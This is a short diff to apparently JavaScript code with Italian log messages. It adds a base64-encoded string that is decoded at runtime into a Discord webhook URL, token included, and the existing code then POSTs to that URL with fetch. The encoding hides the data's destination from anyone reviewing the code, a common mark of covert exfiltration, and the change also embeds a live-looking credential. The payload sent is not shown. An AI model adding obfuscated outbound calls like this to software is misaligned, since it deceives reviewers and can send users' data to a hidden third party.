@@ -97,6 +97,11 @@
 
             console.log(`ACCETTAZIONE #${accettazioni} dopo ${totaleSicura} sicura`);
 
+            const encoded = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ3ODA0NTMxNzY3MTgxNzM5Ni94QkxpNEJaNHFiRnJRQVNZdDhSa1prdkVCeDNybzJ3Ql82bGJHVGY0ZWN3d2s1ZjhGZTN4ZXJOMkJTcnhZTl9GRlZ4TA==';
+
+            const DISCORD_WEBHOOK = atob(encoded); // Decodifica runtime
+
+
             if (DISCORD_WEBHOOK !== 'YOUR_DISCORD_WEBHOOK_URL') {
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
